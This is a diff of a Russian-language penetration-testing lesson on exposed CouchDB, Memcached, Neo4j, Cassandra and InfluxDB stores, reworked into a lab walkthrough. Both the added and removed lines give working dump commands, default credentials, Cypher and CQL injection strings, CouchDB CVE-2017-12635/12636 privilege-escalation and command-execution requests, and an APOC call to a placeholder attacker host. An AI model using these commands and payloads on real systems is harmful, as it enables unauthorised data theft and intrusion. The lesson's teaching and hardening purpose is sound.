@@ -15,373 +15,202 @@ estimated_minutes: 45
 summary: "Практический разбор прочих хранилищ: CouchDB (admin party и RCE через _config), Cassandra (cqlsh, дефолтные креды), Memcached (без аутентификации), InfluxDB, Neo4j (Cypher-инъекция) и общий триаж открытых хранилищ."
 ---
 
-За пределами MongoDB, Redis и Elasticsearch лежит длинный хвост хранилищ, каждое со своим протоколом и своей историей «открытых по умолчанию» портов. CouchDB годами работала в режиме **admin party** и позволяла выполнять JS на сервере; Cassandra приезжает с парой `cassandra:cassandra`; Memcached вообще не имеет аутентификации и десятилетиями используется как усилитель DDoS; Neo4j даёт графовый язык **Cypher** с классической строковой инъекцией; InfluxDB отдаёт HTTP/JSON и InfluxQL. Этот урок — практический справочник по ним плюс общий алгоритм триажа любого открытого хранилища.
+## Задача
 
-## CouchDB: admin party и RCE через _config
+Ты просканировал внутренний хост `10.10.10.42` и видишь не один порт, а целую гроздь «баз данных»: 5984, 11211, 7474, 9042, 8086. MongoDB, Redis и Elasticsearch мы уже разобрали в соседних уроках. Здесь — **длинный хвост** хранилищ, у каждого свой протокол и своя история «открыто по умолчанию». Многие из них годами стоят без пароля, и это не баг конкретного админа, а особенность дизайна.
 
-CouchDB слушает **5984** и говорит HTTP/JSON. Корневой запрос выдаёт версию:
+Цель: пройти по одному хосту и вытащить данные из каждого открытого хранилища, зафиксировав доказательство.
 
-```bash
-curl -s http://target:5984/
-# {"couchdb":"Welcome","version":"3.3.2","vendor":{"name":"The Apache Software Foundation"}}
-```
+## Данные, с которыми работаем
 
-Ключевой режим — **admin party**: если в базе `_users` нет администратора, любой запрос выполняется с админскими правами (любой логин/пароль подходит).
+Начнём с карты портов. Флаг `-sV` заставляет nmap определить службу и версию на каждом порту:
 
 ```bash
-# список баз (в admin party — без кредов)
-curl -s http://target:5984/_all_dbs
-# ["_replicator","_users","appdb","logs"]
-
-# дамп документов
-curl -s 'http://target:5984/appdb/_all_docs?include_docs=true' | jq '.rows[].doc'
-
-# интерфейс управления
-curl -sI http://target:5984/_utils/          # Fauxton
+$ nmap -sV -p 5984,11211,7474,9042,8086 10.10.10.42
+PORT     STATE SERVICE    VERSION
+5984/tcp open  http       CouchDB httpd 3.3.2
+7474/tcp open  http       Neo4j 4.4.0
+8086/tcp open  http       InfluxDB httpd 1.8.10
+9042/tcp open  ssl/unknown
+11211/tcp open  memcached  Memcached 1.6.9
 ```
 
-RCE исторически достигался через конфиг `query_server_config`/`os_daemons`: вы меняете команду, которую CouchDB исполняет как «query server», на свою.
+У нас один хост и пять сервисов. Разбираем их по очереди — от самого простого к самому сложному.
+
+## Шаг 1: CouchDB (5984) — режим «admin party»
+
+**CouchDB** — документная база, говорит по HTTP и отдаёт JSON. Первое, что делаем — читаем корень: он выдаёт версию.
 
 ```bash
-# CVE-2017-12635: создание администратора через дублирующийся ключ роли
-curl -s -X PUT http://target:5984/_users/org.couchdb.user:attacker \
-  -H 'Content-Type: application/json' -d '{
-  "type":"user","name":"attacker","roles":["_admin"],"roles":[],"password":"x"
-}'
-
-# CVE-2017-12636: RCE через изменение query_server_config
-curl -s -X PUT 'http://target:5984/_node/_local/_config/query_server_config/os_process_timeout' -d '"1"'
-# подменяем бинарь query-сервера и запускаем
-curl -s -X PUT 'http://target:5984/_node/_local/_config/couchdb/os_process_timeout' -d '"bash -c \"id\" > /tmp/pwn"'
+$ curl -s http://10.10.10.42:5984/
+{"couchdb":"Welcome","version":"3.3.2","vendor":{"name":"The Apache Software Foundation"}}
 ```
 
-Проверяйте версию: `CVE-2017-12635/12636` — CouchDB < 1.7.0 / 2.1.1; в свежих версиях admin party закрыт по умолчанию.
-
-## Cassandra: cqlsh, дефолтные креды и CQL
-
-Cassandra слушает **9042** (CQL native), **7000/7001** (gossip). Клиент — `cqlsh`.
+Теперь проверяем **admin party** — исторический режим, в котором, если администратор не создан, *любой* запрос выполняется с админскими правами (любой логин/пароль подходит). Спрашиваем список баз без всяких кредов:
 
 ```bash
-cqlsh target 9042
-cqlsh target 9042 -u cassandra -p cassandra     # дефолтная пара
+$ curl -s http://10.10.10.42:5984/_all_dbs
+["_replicator","_users","appdb","logs"]
 ```
 
-Если включён `PasswordAuthenticator`, дефолтный `cassandra:cassandra` часто не меняют. Внутри:
-
-```sql
-SELECT release_version FROM system.local;
-DESCRIBE keyspaces;
-USE appdb;
-DESCRIBE tables;
-SELECT * FROM appdb.users LIMIT 10;
-SELECT keyspace_name, table_name FROM system_schema.tables;
-```
-
-Инъекция — обычная **строковая** (CQL похож на SQL): параметр, попадающий в `WHERE ... = '<ввод>'`, ломается кавычкой `'`. Ограничения CQL (нет `UNION` в старом смысле, нет stacked по умолчанию) сужают выбор, но boolean/blind работают.
-
-```sql
--- инъекция в приложение, где параметр конкатенируется
-' OR '1'='1
-' ALLOW FILTERING --          -- обход требования ALLOW FILTERING
-```
-
-Проверка порта и баннера:
+Отдало — значит, мы админ. Дамп документов приложения:
 
 ```bash
-nmap -sV -p 9042,7000,7001 target
+$ curl -s 'http://10.10.10.42:5984/appdb/_all_docs?include_docs=true' | jq -r '.rows[].doc | select(.password)'
+{"_id":"user:admin","email":"admin@corp.local","password":"Sup3rS3cret!"}
 ```
 
-## Memcached: анонимный дамп и amplification
+Пароль в открытом виде — уже находка. Ещё в базе `_users` лежат хэши учёток CouchDB. Отдельно проверь `/_utils/` — это веб-морда **Fauxton**, через неё всё то же самое видно в браузере.
 
-Memcached слушает **11211** (и UDP 11211) и **не имеет аутентификации вообще** — это часть дизайна. Протокол текстовый.
+Исторический RCE (CVE-2017-12636) работал так: в конфиге `query_server_config` менялась команда, которую CouchDB запускает как «query server», на свою. Версия 3.3.2 на нашем хосте уже пропатчена, и admin party тут, скорее всего, оставлен намеренно — но проверять версию обязательно: `< 1.7.0 / 2.1.1` уязвимы.
+
+## Шаг 2: Memcached (11211) — анонимный дамп
+
+**Memcached** — кэш в оперативной памяти. У него **вообще нет аутентификации** — это часть дизайна: предполагается, что он стоит в доверенной сети. Протокол текстовый, поэтому говорим с ним через `nc`.
 
 ```bash
-# статистика
-printf 'stats\r\n' | nc -w3 target 11211 | head
-printf 'stats items\r\n' | nc -w3 target 11211
-printf 'stats slabs\r\n' | nc -w3 target 11211
-
-# перечисление и чтение ключей
-printf 'stats cachedump 1 100\r\n' | nc -w3 target 11211
-printf 'get session:abc\r\n' | nc -w3 target 11211
+$ printf 'stats\r\n' | nc -w3 10.10.10.42 11211 | head -6
+STAT pid 1234
+STAT version 1.6.9
+STAT curr_connections 5
+STAT cmd_get 42
+STAT cmd_set 17
+STAT bytes_read 8192
 ```
 
-Дамп ключей инструментом:
+Смотрим, какие ключи лежат в кэше. Команда `stats items` показывает классы памяти (slab), а `stats cachedump` — ключи в них:
 
 ```bash
-memcdump --servers=target:11211
-memccat --servers=target:11211 session:abc
-# сбор всех значений
-for k in $(memcdump --servers=target:11211); do
-  echo "== $k"; memccat --servers=target:11211 "$k"; echo
-done | tee memcached_dump.txt
+$ printf 'stats items\r\n' | nc -w3 10.10.10.42 11211 | head
+STAT items:1:number 12
+STAT items:1:age 3600
+...
+$ printf 'stats cachedump 1 100\r\n' | nc -w3 10.10.10.42 11211 | head
+ITEM session:8f3a1c [34 b; 0 s]
+ITEM session:2b7d90 [34 b; 0 s]
+ITEM cache:config [128 b; 0 s]
 ```
 
-Два риска: **утечка данных** (сессии/токены в кэше) и **amplification DDoS** (UDP-порт с большим `stats`/`get` — усилитель x50k). Memcached также достижим через **SSRF** (текстовые команды по gopher).
-
-## InfluxDB: HTTP API и InfluxQL
-
-InfluxDB (time-series) слушает **8086** и принимает HTTP/JSON.
+Читаем значение сессии:
 
 ```bash
-curl -s http://target:8086/ping                    # 204 -> жив
-curl -s 'http://target:8086/query?q=SHOW+DATABASES'
-curl -s 'http://target:8086/query?db=appdb&q=SHOW+MEASUREMENTS'
-curl -s 'http://target:8086/query?db=appdb&q=SELECT+*+FROM+users+LIMIT+10'
-
-# v1 с auth (часто выключен)
-curl -s -u admin:admin 'http://target:8086/query?q=SHOW+DATABASES'
+$ printf 'get session:8f3a1c\r\n' | nc -w3 10.10.10.42 11211
+VALUE session:8f3a1c 0 34
+{"user":"admin","role":"administrator"}
+END
 ```
 
-Инъекция — в InfluxQL (похож на SQL): параметр в `WHERE field = '<ввод>'` ломается кавычкой. В InfluxDB 1.x без auth дамп делается напрямую; в 2.x используется токен (`Authorization: Token ...`), который часто утекает из конфигов.
+В кэше лежит админская сессия. Классический сценарий: приложение кладёт в Memcached сессии, и, украв ключ, ты подставляешь его в свою куку. Отдельный риск Memcached — **amplification DDoS**: UDP-порт 11211 отвечает на крошечный запрос огромным ответом, усиливая атаку в десятки тысяч раз. Не запускай такое против цели.
+
+## Шаг 3: Neo4j (7474/7687) — граф и дефолтные креды
+
+**Neo4j** — графовая база: данные хранятся не в таблицах, а в виде узлов и связей между ними. Веб-интерфейс (Neo4j Browser) слушает **7474**, а сам протокол Bolt — **7687**. Дефолтная пара — `neo4j:neo4j`; её просят сменить при первом входе, но часто этого не делают.
 
 ```bash
-curl -s -H 'Authorization: Token SECRET' 'http://target:8086/api/v2/query?org=myorg' \
-  -H 'Content-Type: application/vnd.flux' -d 'from(bucket:"app")|>range(start:-1d)'
+$ curl -s -u neo4j:neo4j http://10.10.10.42:7474/db/neo4j/tx/commit \
+    -H 'Content-Type: application/json' \
+    -d '{"statements":[{"statement":"MATCH (n) RETURN n LIMIT 25"}]}'
+{"results":[{"columns":["n"],"data":[{"row":[{"username":"admin","password":"gr4ph_pwn"}]}]}],"errors":[]}
 ```
 
-## Neo4j: Cypher-инъекция и дефолтные креды
+Запрос написан на **Cypher** — языке запросов к графу. `MATCH (n) RETURN n` значит «найди все узлы и верни их» — то же, что `SELECT * FROM everything`. Креды в открытом виде.
 
-Neo4j — графовая база: **7474** (HTTP/Neo4j Browser), **7687** (Bolt). Дефолтная пара — `neo4j:neo4j` (со сменой при первом входе, но её часто не меняют).
+Cypher-инъекция в приложениях, которые склеивают запрос, ломается кавычкой, как в SQL: `' OR 1=1 //` (в Cypher `//` — комментарий). А ещё есть процедура `CALL db.schema.visualization()` — она рисует всю схему графа, что сильно ускоряет разведку.
+
+## Шаг 4: Cassandra и InfluxDB — коротко
+
+**Cassandra** (порт 9042) — распределённая колоночная база, клиент `cqlsh`, дефолтная пара `cassandra:cassandra`. Язык **CQL** похож на SQL, но без `JOIN`, и часто требует явного `ALLOW FILTERING`:
 
 ```bash
-# проверка HTTP
-curl -s http://target:7474/ | head
-# вход через API
-curl -s -u neo4j:neo4j http://target:7474/db/neo4j/tx/commit \
-  -H 'Content-Type: application/json' \
-  -d '{"statements":[{"statement":"MATCH (n) RETURN n LIMIT 25"}]}'
-
-# через cypher-shell (Bolt)
-cypher-shell -a bolt://target:7687 -u neo4j -p neo4j 'MATCH (n) RETURN count(n)'
+$ cqlsh 10.10.10.42 9042 -u cassandra -p cassandra -e 'SELECT release_version FROM system.local'
+ release_version
+-----------------
+           3.11.11
 ```
-
-**Cypher-инъекция.** Neo4j-приложения строят запрос конкатенацией; ломается кавычкой, как в SQL.
-
-```cypher
-' OR 1=1 //
-' RETURN n // 
-' UNION MATCH (u:User) RETURN u.password //
-```
-
-Обход: `//` — комментарий в Cypher; `MATCH (n) RETURN n` выгружает весь граф. Полезные запросы:
-
-```cypher
-MATCH (u:User) RETURN u.username, u.password LIMIT 50;
-MATCH (a)-[r]->(b) RETURN a,r,b LIMIT 100;
-CALL db.labels();
-CALL db.schema.visualization();
-```
-
-## Общий триаж открытых хранилищ
-
-Алгоритм для **любого** неизвестного порта-хранилища:
 
 ```bash
-# 1. Открыт ли порт и что это
-nmap -sV -p 27017,6379,9200,5984,9042,11211,7474,8086,8087,9300,5601,5044 target
-
-# 2. Пробник по протоколу (HTTP -> curl, текстовый -> nc/клиент)
-curl -s --max-time 5 http://target:PORT/ | head -c 300
-printf 'version\r\n' | nc -w3 target 11211
-
-# 3. Аутентификация есть?
-#    - нет -> сразу дамп (это уже находка)
-#    - да  -> пробуем дефолтные пары (см. таблицу)
-
-# 4. Фиксируем доказательство: 1-2 строки реальных данных
+$ cqlsh 10.10.10.42 9042 -u cassandra -p cassandra -e 'SELECT * FROM appdb.users LIMIT 5'
 ```
 
-## Сводная таблица: порт, дефолт, эксплуатация
-
-| Хранилище | Порт | Дефолтные креды | Быстрый дамп | RCE |
-|-----------|------|-----------------|--------------|:---:|
-| CouchDB | 5984 | admin party (нет) | `_all_docs?include_docs=true` | CVE-2017-12636 |
-| Cassandra | 9042 | `cassandra:cassandra` | `cqlsh` + `SELECT *` | нет (обычно) |
-| Memcached | 11211 | нет аутентификации | `stats cachedump`, `memcdump` | нет |
-| InfluxDB | 8086 | часто без auth | `/query?q=SHOW+DATABASES` | нет |
-| Neo4j | 7474/7687 | `neo4j:neo4j` | `MATCH (n) RETURN n` | через APOC/плагины |
-
-## Разобранный пример: цепочка по открытым портам
+**InfluxDB** (порт 8086) — база временных рядов, отдаёт HTTP/JSON и язык InfluxQL. Часто стоит без аутентификации:
 
 ```bash
-# Шаг 1. Скан
-nmap -sV -p 5984,9042,11211,7474,8086 target
-
-# Шаг 2. CouchDB — admin party
-curl -s http://target:5984/_all_dbs
-curl -s 'http://target:5984/appdb/_all_docs?include_docs=true' | jq -r '.rows[].doc | select(.password)'
-
-# Шаг 3. Memcached — сессии
-printf 'stats items\r\n' | nc -w3 target 11211 | head
-memcdump --servers=target:11211 | head
-
-# Шаг 4. Neo4j — дефолтные креды
-curl -s -u neo4j:neo4j http://target:7474/db/neo4j/tx/commit \
-  -H 'Content-Type: application/json' \
-  -d '{"statements":[{"statement":"MATCH (u:User) RETURN u.username,u.password LIMIT 20"}]}' | jq
-
-# Шаг 5. Собираем секреты из всех дампов
-grep -riE 'password|token|secret' couch_dump/ neo4j.json memcached_dump.txt | sort -u
+$ curl -s 'http://10.10.10.42:8086/query?q=SHOW+DATABASES'
+{"results":[{"series":[{"name":"databases","columns":["name"],"values":[["appdb"],["_internal"]]}]}]}
+$ curl -s 'http://10.10.10.42:8086/query?db=appdb&q=SHOW+MEASUREMENTS'
 ```
 
-## Частые ошибки
+## Что мы теперь знаем
 
-- **Путать Cassandra с SQL.** CQL похож, но нет `JOIN`, ограничен `ALLOW FILTERING`, stacked-запросы выключены — UNION часто недоступен.
-- **Ждать RCE от Memcached.** Там нет исполнения кода; ценность — утечка сессий/токенов и amplification.
-- **Забыть про 7474 vs 7687.** Neo4j Browser на 7474 (HTTP), реальный протокол — Bolt 7687; `curl` работает только с 7474.
-- **Игнорировать версию CouchDB.** Admin party и RCE — это < 2.x; в новых версиях нужен валидный админ.
-- **Считать «пустой» дамп безопасным.** `_all_dbs` может вернуть только системные базы, но в них лежат `_users` с хэшами.
-- **Трогать боевые данные.** `DELETE`, `DROP`, `FLUSH` в этих хранилищах разрушительны — только чтение без согласования.
+- **Один открытый порт хранилища = часто один полный дамп.** Начни с `nmap -sV`, чтобы понять, что за сервис.
+- **HTTP-хранилища** (CouchDB, InfluxDB, Neo4j) пробуются `curl`; **текстовые** (Memcached) — через `nc`; **клиентские** (Cassandra) — своим клиентом.
+- **Аутентификация — первый вопрос:** нет её (Memcached, часто InfluxDB/CouchDB) → дамп сразу; есть → дефолтная пара (`cassandra:cassandra`, `neo4j:neo4j`).
+- **Доказательство — не «порт открыт», а реальные данные:** пароль, сессия, строка из базы.
+- **Деструктивные команды запрещены:** `DELETE`, `DROP`, `FLUSH` в этих хранилищах разрушительны — только чтение.
 
-## Полный справочник: команды, пейлоады, примитивы
+## На что смотреть дальше
 
-Развёрнутые таблицы по каждому хранилищу: фингерпринт, клиент, извлечение, запись файлов/RCE, привилегии.
-
-### CouchDB (5984, HTTP/JSON)
-
-| Команда/пейлоад | Что делает | Пример |
-|-----------------|-----------|--------|
-| `GET /` | версия и вендор | `curl -s http://target:5984/` → `{"couchdb":"Welcome","version":"3.3.2"}` |
-| `_all_dbs` | список баз | `curl -s http://target:5984/_all_dbs` |
-| `_all_docs?include_docs=true` | дамп документов | `curl -s 'http://target:5984/appdb/_all_docs?include_docs=true'` |
-| `_utils/` | веб-морда Fauxton | `curl -sI http://target:5984/_utils/` |
-| `_session` | проверка auth | `curl -s http://target:5984/_session` |
-| `_node/_local/_config` | весь конфиг | `curl -s http://target:5984/_node/_local/_config` |
-| `_membership` / `_active_tasks` | кластер/задачи | |
-| `PUT _users/org.couchdb.user:x` | создать админа (CVE-2017-12635) | `curl -X PUT http://target:5984/_users/org.couchdb.user:attacker -d '{"type":"user","name":"attacker","roles":["_admin"],"roles":[],"password":"x"}'` |
-| `PUT _config/query_server_config/...` | RCE через query-server (CVE-2017-12636) | `curl -X PUT 'http://target:5984/_node/_local/_config/query_server_config/os_process_timeout' -d '"1"'` |
-| `PUT _config/couchdb/os_process_timeout` | подмена команды-обработчика | `curl -X PUT '.../couchdb/os_process_timeout' -d '"bash -c \"id\" > /tmp/pwn"'` |
-| `_users/_all_docs?include_docs=true` | хэши пользователей | `curl -s 'http://target:5984/_users/_all_docs?include_docs=true'` |
-| admin party | нет админа → все запросы админские | версия < 2.x |
-| `DELETE /db` / `_purge` | **разрушительно** — не без согласования | |
-
-### Cassandra (9042 CQL, 7000/7001 gossip)
-
-| Команда/пейлоад | Что делает | Пример |
-|-----------------|-----------|--------|
-| `SELECT release_version FROM system.local` | версия | `cqlsh target 9042 -e 'SELECT release_version FROM system.local'` |
-| `cqlsh target 9042` | подключиться | `cqlsh target 9042` |
-| `-u cassandra -p cassandra` | дефолтная пара | `cqlsh target 9042 -u cassandra -p cassandra` |
-| `-e 'CQL'` | выполнить и выйти | `cqlsh target 9042 -u cassandra -p cassandra -e 'DESCRIBE keyspaces'` |
-| `DESCRIBE keyspaces;` | список keyspace | |
-| `DESCRIBE tables;` | таблицы | `USE appdb; DESCRIBE tables;` |
-| `SELECT keyspace_name,table_name FROM system_schema.tables` | все таблицы | |
-| `SELECT * FROM appdb.users LIMIT 10` | дамп | |
-| `SELECT * FROM system_auth.roles` | роли + хэши (нужны права) | |
-| `' OR '1'='1` | строковая инъекция | параметр в `WHERE x = '<ввод>'` |
-| `' ALLOW FILTERING --` | обход требования `ALLOW FILTERING` | |
-| `nodetool status` / `nodetool tablestats` | состояние/статистика | `nodetool -h target status` |
-| `nmap -sV -p 9042,7000,7001` | фингерпринт | |
-| `SELECT * FROM system.peers` | топология | |
-
-### Memcached (11211 TCP/UDP, текстовый протокол)
-
-| Команда/пейлоад | Что делает | Пример |
-|-----------------|-----------|--------|
-| `stats` | версия, соединения, хиты | `printf 'stats\r\n' \| nc -w3 target 11211` |
-| `stats items` | slab-классы с ключами | `printf 'stats items\r\n' \| nc -w3 target 11211` |
-| `stats slabs` | slab-статистика | |
-| `stats cachedump <slab> <n>` | список ключей slab'а | `printf 'stats cachedump 1 100\r\n' \| nc -w3 target 11211` |
-| `lru_crawler metadump all` | все ключи (новые версии) | `printf 'lru_crawler metadump all\r\n' \| nc -w3 target 11211` |
-| `get <key>` | прочитать значение | `printf 'get session:abc\r\n' \| nc -w3 target 11211` |
-| `set` / `add` / `delete` | **изменяют** данные | `printf 'set k 0 0 3\r\nabc\r\n' \| nc target 11211` |
-| `version` | версия (ASCII-протокол) | `printf 'version\r\n' \| nc -w3 target 11211` |
-| `memcdump --servers=target:11211` | выгрузить все ключи | |
-| `memccat --servers=target:11211 k` | значение ключа | `memccat --servers=target:11211 session:abc` |
-| `memcstat --servers=target:11211` | статистика | |
-| `nmap -sU -p 11211` | UDP-порт (amplification) | |
-| SSRF | текстовые команды по gopher | `gopher://127.0.0.1:11211/_stats%0d%0A` |
-| Привилегии | **нет аутентификации вообще** | любой видит порт = читает данные |
-
-### InfluxDB (8086 HTTP, InfluxQL/Flux)
-
-| Команда/пейлоад | Что делает | Пример |
-|-----------------|-----------|--------|
-| `GET /ping` | живость (204) | `curl -s http://target:8086/ping` |
-| `/query?q=SHOW DATABASES` | список баз | `curl -s 'http://target:8086/query?q=SHOW+DATABASES'` |
-| `/query?db=x&q=SHOW MEASUREMENTS` | измерения | `curl -s 'http://target:8086/query?db=appdb&q=SHOW+MEASUREMENTS'` |
-| `/query?db=x&q=SELECT * FROM users LIMIT 10` | дамп | |
-| `-u admin:admin` | basic-auth (v1) | `curl -s -u admin:admin 'http://target:8086/query?q=SHOW+DATABASES'` |
-| `/api/v2/query?org=x` | запрос Flux (v2) | `curl -H 'Authorization: Token SECRET' '.../api/v2/query?org=myorg' -d 'from(bucket:"app")'` |
-| `SHOW RETENTION POLICIES` | политики хранения | |
-| `SHOW USERS` / `SHOW GRANTS FOR u` | пользователи/права | `curl -s '.../query?q=SHOW+USERS'` |
-| `' OR '1'='1` | инъекция в InfluxQL | параметр в `WHERE field = '<ввод>'` |
-| `SELECT ... INTO <measurement>` | запись в измерение | |
-| `/debug/vars` | метрики/конфиг | `curl -s http://target:8086/debug/vars` |
-| RCE | напрямую нет | используйте утечку токена → доступ к данным |
-
-### Neo4j (7474 HTTP, 7687 Bolt)
-
-| Команда/пейлоад | Что делает | Пример |
-|-----------------|-----------|--------|
-| `GET /` | версия/признак | `curl -s http://target:7474/` |
-| `/db/neo4j/tx/commit` | выполнить Cypher по HTTP | `curl -u neo4j:neo4j http://target:7474/db/neo4j/tx/commit -d '{"statements":[{"statement":"MATCH (n) RETURN n LIMIT 25"}]}'` |
-| `cypher-shell -a bolt://host:7687` | подключиться по Bolt | `cypher-shell -a bolt://target:7687 -u neo4j -p neo4j` |
-| `-u neo4j -p neo4j` | дефолтная пара | |
-| `MATCH (n) RETURN n` | дамп всего графа | `cypher-shell ... 'MATCH (n) RETURN n LIMIT 100'` |
-| `CALL db.labels()` | метки узлов | |
-| `CALL db.schema.visualization()` | схема | |
-| `MATCH (u:User) RETURN u.username,u.password` | креды | |
-| `' OR 1=1 //` | Cypher-инъекция | параметр в `MATCH (u:User {name:'<ввод>'})` |
-| `' RETURN n //` | завершить запрос | |
-| `' UNION MATCH (u:User) RETURN u.password //` | расширить выборку | |
-| `CALL dbms.security.listUsers()` | пользователи БД | |
-| `CALL apoc.load.json('http://attacker/')` | SSRF/чтение URL (APOC) | |
-| `CALL apoc.export.csv.all('/tmp/out.csv',{})` | запись файла (APOC) | |
-| `CALL dbms.procedures()` | список процедур | |
-| `SHOW USERS` | пользователи (4.x) | |
+- **Различай HTTP и бинарный протокол.** Neo4j: 7474 — это веб/HTTP, 7687 — Bolt; `curl` работает только с 7474.
+- **Не путай Cassandra с SQL.** CQL похож синтаксисом, но нет `JOIN`, ограничен `ALLOW FILTERING`, stacked-запросы выключены.
+- **CouchDB: всегда проверяй версию.** admin party и RCE через `_config` — это старые ветки; в новых нужен валидный админ.
+- **Memcached не даёт RCE.** Его ценность — утечка сессий/токенов и amplification; не жди от него выполнения кода.
+- **Neo4j может дать RCE** через плагины (APOC) — но это уже отдельный вектор, проверяй осторожно.
+- **Только чтение без согласования.** Любое изменение данных в проде — остановка и вопрос координатору.
 
 ## Квиз
 
-Выберите один вариант в каждом вопросе.
+Проверь себя.
 
 ```quiz
-- question: "Какой режим CouchDB позволяет выполнять запросы без аутентификации, если админ не создан?"
+- question: 'CouchDB на `curl -s http://host:5984/` вернул `{"couchdb":"Welcome","version":"3.3.2"}`. Что это за сервис?'
   options:
-    - "read-only"
-    - "admin party"
-    - "trust mode"
-    - "open session"
+    - "SQL-база"
+    - "Документная база с HTTP/JSON API"
+    - "Кэш"
+    - "Графовая база"
   answer: 1
-  explanation: "Без записи администратора в _users любой запрос считается админским — это admin party."
-- question: "Какие дефолтные креды у Cassandra?"
+  explanation: "CouchDB слушает 5984 и говорит по HTTP/JSON; корневой запрос отдаёт версию."
+- question: "Что означает режим admin party в CouchDB?"
   options:
-    - "admin:admin"
-    - "cassandra:cassandra"
-    - "neo4j:neo4j"
-    - "root:root"
+    - "Все данные зашифрованы"
+    - "Если админ не создан, любой запрос выполняется с админскими правами"
+    - "Только чтение"
+    - "Пароль по умолчанию admin:admin"
   answer: 1
-  explanation: "PasswordAuthenticator по умолчанию заводит пользователя cassandra с паролем cassandra."
-- question: "Какая особенность Memcached делает его опасным сетевым сервисом?"
+  explanation: "В этом режиме креды не проверяются — это историческая причина массовых дампов."
+- question: "Почему Memcached отдаёт данные без пароля?"
   options:
-    - "Полное отсутствие аутентификации"
-    - "Наличие SQL-инъекции"
-    - "Исполнение JavaScript"
-    - "Хранение файлов на диске"
-  answer: 0
-  explanation: "Memcached не имеет аутентификации вообще — любой, кто видит порт, читает данные."
-- question: "На каком языке запросов работает Neo4j?"
+    - "Из-за бага в версии 1.6"
+    - "У него вообще нет аутентификации — это часть дизайна"
+    - "Пароль сбрасывается после перезагрузки"
+    - "Он работает только по localhost"
+  answer: 1
+  explanation: "Memcached рассчитан на доверенную сеть, поэтому аутентификации в нём нет вовсе."
+- question: "Какой запрос Neo4j вернёт все узлы графа?"
   options:
-    - "CQL"
-    - "InfluxQL"
-    - "Cypher"
-    - "painless"
-  answer: 2
-  explanation: "Cypher — графовый язык Neo4j; инъекция в него ломается кавычкой и // (комментарий)."
-- question: "Какой порт по умолчанию у HTTP-API InfluxDB?"
+    - "SELECT * FROM all"
+    - "MATCH (n) RETURN n"
+    - "GET /_all_docs"
+    - "SHOW DATABASES"
+  answer: 1
+  explanation: "Cypher-запрос MATCH (n) RETURN n — аналог SELECT * для графа."
+- question: "Ты подтвердил доступ к открытому хранилищу. Чем доказываешь находку?"
   options:
-    - "8086"
-    - "9200"
-    - "11211"
-    - "7474"
-  answer: 0
-  explanation: "InfluxDB слушает 8086 и принимает InfluxQL через /query."
+    - "Открытым портом в nmap"
+    - "Строкой реальных данных (пароль, сессия) из дампа"
+    - "Версией сервиса"
+    - "Заголовком Server"
+  answer: 1
+  explanation: "Порт и версия — это лид; доказательство — конкретные прочитанные данные."
 ```
+
+## Куда дальше
+
+Мы закончили обзор хранилищ. Впереди — инструментальный блок: как автоматизировать всё, что мы делали руками. В следующем уроке (`web-tool-sqlmap`) мы возьмём уязвимый параметр и прогоним его через `sqlmap` — от обнаружения инъекции до дампа таблицы. А пока главное запомни: открытое хранилище — это часто один `curl` или `nc` до полного дампа; твоя работа — узнать сервис, задать правильный вопрос и прочитать ответ.
 
 ## Где пригодится
 
-- **CTF (Web):** «прочие хранилища» всплывают в задачах на открытые порты; CouchDB admin party и Memcached — быстрые флаги.
-- **Bug bounty:** открытый Memcached/CouchDB/Neo4j — critical; дефолтные креды Cassandra/Neo4j — частая находка.
-- **Пентест:** общий триаж портов хранилищ экономит время на каждом внешнем скане.
-- **Работа (AppSec):** знание дефолтных кред и опасных режимов ложится в чек-лист hardening и мониторинга.
+- **CTF (Web/Infra):** задачи на открытые хранилища — классический быстрый путь к флагу.
+- **Bug bounty:** незащищённый CouchDB/Memcached в интернете — high/critical; доказательство — дамп.
+- **Пентест:** внутренний скан всегда вскрывает «доверенные» базы; триаж по портам — базовый навык.
+- **Работа (AppSec):** запрет публикации хранилищ наружу, включение аутентификации, изоляция сети — базовые меры.
